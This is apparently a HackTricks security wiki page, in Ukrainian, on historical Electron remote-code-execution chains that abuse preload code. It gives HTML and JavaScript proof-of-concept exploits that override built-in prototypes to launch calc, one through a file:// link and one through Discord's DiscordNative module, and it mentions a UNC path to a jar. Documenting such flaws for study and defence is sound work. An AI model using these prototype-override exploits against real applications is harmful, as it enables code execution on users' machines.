# Electron contextIsolation RCE via preload code

{{#include ../../banners/hacktricks-training.md}}

Це **історичні ланцюжки**, у яких preload-код використовував спільні внутрішні об’єкти JavaScript або привілейовані API з вмістом renderer, контрольованим зловмисником. Якщо context isolation увімкнено, preload і сторінка зазвичай працюють в окремих realms JavaScript, тому перевизначення прототипів на сторінці автоматично не впливають на об’єкти preload. Перевіряйте ланцюжок для конкретної версії Electron/застосунку та реалізації bridge.<sup>[[3]](#references)</sup>

## Приклад 1

Приклад із [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)<sup>[[1]](#references)</sup>

Цей код відкриває посилання http(s) у браузері за замовчуванням:

![Electron contextIsolation RCE via preload code - Приклад 1: Цей код відкриває посилання http(s) у браузері за замовчуванням](<../../images/image (768).png>)

У вразливому історичному застосунку навігація до локального файлу, наприклад `file:///C:/Windows/System32/calc.exe`, могла дійти до шляху запуску ОС; `SAFE_PROTOCOLS.indexOf` мав цьому запобігти.

Отже, зловмисник міг впровадити цей код JS через XSS або довільну навігацію сторінки:

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
```

Оскільки виклик `SAFE_PROTOCOLS.indexOf` завжди повертатиме 1337, зловмисник може обійти захист і запустити calc. Фінальний експлойт:

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```

Перевірте оригінальні слайди, щоб знайти інші способи запускати програми без запиту дозволу.<sup>[[1]](#references)</sup>

У тогочасному ланцюжку Discord також розглядалося завантаження через UNC-подібний шлях `file://127.0.0.1/electron/rce.jar` як ще один потенційний шлях виконання; перевірте його доступність на конкретній збірці Windows/Electron.<sup>[[2]](#references)</sup>

## Приклад 2: RCE у застосунку Discord

Приклад з [https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)<sup>[[2]](#references)</sup>

Перевіряючи preload-скрипти, я виявив, що Discord надає вебсторінці функцію, яка дозволяє викликати деякі дозволені модулі через `DiscordNative.nativeModules.requireModule('MODULE-NAME')`.\
Тут я не зміг скористатися модулями, які можна безпосередньо використати для RCE, наприклад модулем _child_process_, але **знайшов код, за допомогою якого можна досягти RCE, перевизначивши вбудовані методи JavaScript** та втрутившись у виконання доступного модуля.

Нижче наведено PoC. Мені вдалося підтвердити, що застосунок **calc** **запускається**, коли я в**икликав функцію `getGPUDriverVersions`**, визначену в модулі "_discord_utils_", з DevTools, одночасно **перевизначаючи `RegExp.prototype.test` і `Array.prototype.join`**.

```javascript
RegExp.prototype.test = function () {
  return false
}
Array.prototype.join = function () {
  return "calc"
}
DiscordNative.nativeModules
  .requireModule("discord_utils")
  .getGPUDriverVersions()
```

Функція `getGPUDriverVersions` намагається виконати програму за допомогою бібліотеки "_execa_", як показано нижче:

```javascript
module.exports.getGPUDriverVersions = async () => {
  if (process.platform !== "win32") {
    return {}
  }

  const result = {}
  const nvidiaSmiPath = `${process.env["ProgramW6432"]}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`

  try {
    result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []))
  } catch (e) {
    result.nvidia = { error: e.toString() }
  }

  return result
}
```

Зазвичай _execa_ намагається виконати "_nvidia-smi.exe_", указаний у змінній `nvidiaSmiPath`, однак через перевизначені `RegExp.prototype.test` і `Array.prototype.join` **аргумент замінюється на "**_**calc**_**" під час внутрішньої обробки _execa**_**.

Зокрема, аргумент замінюється через вплив на шляхи визначення команди й обробки аргументів в історичному парсері `cross-spawn`.<sup>[[4]](#references)</sup>

## References

- [1] [Electron: зловживання відсутністю ізоляції контексту — CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)
- [2] [RCE у десктопному застосунку Discord](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)
- [3] [Electron — ізоляція контексту](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [4] [`node-cross-spawn` — ревізія парсера та точні шляхи, які використовує ланцюжок (рядки 36–55)](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36-L55)
{{#include ../../banners/hacktricks-training.md}}
